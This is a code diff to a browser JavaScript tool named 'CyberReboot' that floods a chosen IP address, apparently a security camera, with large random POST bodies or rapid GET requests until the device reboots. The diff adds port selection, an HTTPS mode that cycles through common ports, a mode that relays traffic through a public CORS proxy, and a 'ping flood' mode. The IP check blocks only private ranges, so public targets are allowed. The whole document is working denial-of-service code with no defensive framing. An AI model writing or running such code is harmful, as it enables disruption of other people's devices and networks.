@@ -1,10 +1,12 @@
 class CyberReboot {
     constructor(config) {
         this.ipInput = document.querySelector(config.ipInput);
+        this.portInput = document.querySelector(config.portInput);
         this.dataSlider = document.querySelector(config.dataSlider);
         this.dataAmount = document.querySelector(config.dataAmount);
         this.durationInput = document.querySelector(config.durationInput);
         this.durationUnit = document.querySelector(config.durationUnit);
+        this.modeSelect = document.querySelector(config.modeSelect);
         this.batchSelect = document.querySelector(config.batchSelect);
         this.saveIpBtn = document.querySelector(config.saveIpBtn);
         this.startBtn = document.querySelector(config.startBtn);
@@ -13,6 +15,7 @@ class CyberReboot {
         this.historyTable = document.querySelector(config.historyTable);
         this.isOverloading = false;
         this.abortController = null;
+        this.proxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Public CORS proxy (limited)
 
         this.init();
     }
@@ -84,10 +87,47 @@ class CyberReboot {
         return regex.test(ip) && !ip.startsWith('192.168.') && !ip.startsWith('10.');
     }
 
+    async sendData(url, payload, chunkSizeMb, dataMb, endTime) {
+        let sentMb = 0;
+        while (this.isOverloading && sentMb < dataMb && Date.now() < endTime) {
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/octet-stream' },
+                    body: payload,
+                    signal: this.abortController.signal
+                });
+                sentMb += chunkSizeMb;
+                this.statusEl.textContent = `Status: Sent ${sentMb} MB to ${url}...`;
+            } catch (e) {
+                this.statusEl.textContent = `Status: Error or camera rebooted (${e.message})`;
+                break;
+            }
+        }
+        return sentMb;
+    }
+
+    async pingFlood(url, endTime) {
+        let count = 0;
+        while (this.isOverloading && Date.now() < endTime) {
+            try {
+                await fetch(url, { method: 'GET', signal: this.abortController.signal });
+                count++;
+                this.statusEl.textContent = `Status: Sent ${count} pings to ${url}...`;
+            } catch (e) {
+                this.statusEl.textContent = `Status: Error or camera rebooted (${e.message})`;
+                break;
+            }
+        }
+        return count;
+    }
+
     async startOverload() {
         const ip = this.batchSelect.value || this.ipInput.value;
+        const port = this.portInput.value || '';
         const dataMb = parseInt(this.dataSlider.value);
         const duration = parseInt(this.durationInput.value) * (this.durationUnit.value === 'minutes' ? 60 : 1);
+        const mode = this.modeSelect.value;
 
         if (!this.validateIp(ip) && !this.batchSelect.value) {
             alert('Invalid IP address');
@@ -98,7 +138,7 @@ class CyberReboot {
         this.abortController = new AbortController();
         this.startBtn.disabled = true;
         this.stopBtn.disabled = false;
-        this.statusEl.textContent = `Status: Overloading ${ip} with ${dataMb} MB...`;
+        this.statusEl.textContent = `Status: Overloading ${ip}${port ? `:${port}` : ''} with ${dataMb} MB...`;
 
         const startTime = Date.now();
         let sentMb = 0;
@@ -107,29 +147,33 @@ class CyberReboot {
         // Generate payload (split into chunks to avoid browser memory limits)
         const chunkSizeMb = Math.min(dataMb, 100); // Max 100 MB per request
         const payload = new ArrayBuffer(chunkSizeMb * 1024 * 1024);
-        // Fill with random data
         const view = new Uint8Array(payload);
         for (let i = 0; i < view.length; i++) {
             view[i] = Math.random() * 255;
         }
 
         try {
-            while (this.isOverloading && Date.now() < endTime && sentMb < dataMb) {
-                await fetch(`http://${ip}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/octet-stream' },
-                    body: payload,
-                    signal: this.abortController.signal
-                }).catch(e => {
-                    this.statusEl.textContent = `Status: Camera at ${ip} likely rebooted`;
-                    this.isOverloading = false;
-                });
-                sentMb += chunkSizeMb;
-                this.statusEl.textContent = `Status: Sent ${sentMb} MB to ${ip}...`;
+            if (mode === 'https') {
+                // Try HTTPS with specified or common ports
+                const ports = port ? [port] : ['443', '8443', '80'];
+                for (const p of ports) {
+                    const url = `https://${ip}${p ? `:${p}` : ''}`;
+                    sentMb = await this.sendData(url, payload, chunkSizeMb, dataMb, endTime);
+                    if (!this.isOverloading) break;
+                    if (sentMb >= dataMb || Date.now() >= endTime) break;
+                    this.statusEl.textContent = `Status: HTTPS failed on port ${p}, trying next...`;
+                }
+            } else if (mode === 'proxy') {
+                // Use CORS proxy for HTTP
+                const url = `${this.proxyUrl}http://${ip}${port ? `:${port}` : ''}`;
+                sentMb = await this.sendData(url, payload, chunkSizeMb, dataMb, endTime);
+            } else if (mode === 'ping') {
+                // Ping flood with rapid GET requests
+                sentMb = await this.pingFlood(`http://${ip}${port ? `:${port}` : ''}`, endTime);
             }
         } catch (e) {
             if (e.name !== 'AbortError') {
-                this.statusEl.textContent = `Status: Error or camera rebooted`;
+                this.statusEl.textContent = `Status: Error or camera rebooted (${e.message})`;
             }
         }
 
@@ -138,7 +182,7 @@ class CyberReboot {
         }
 
         const history = {
-            ip,
+            ip: `${ip}${port ? `:${port}` : ''}`,
             dataMb: sentMb,
             duration: (Date.now() - startTime) / 1000,
             timestamp: Date.now()
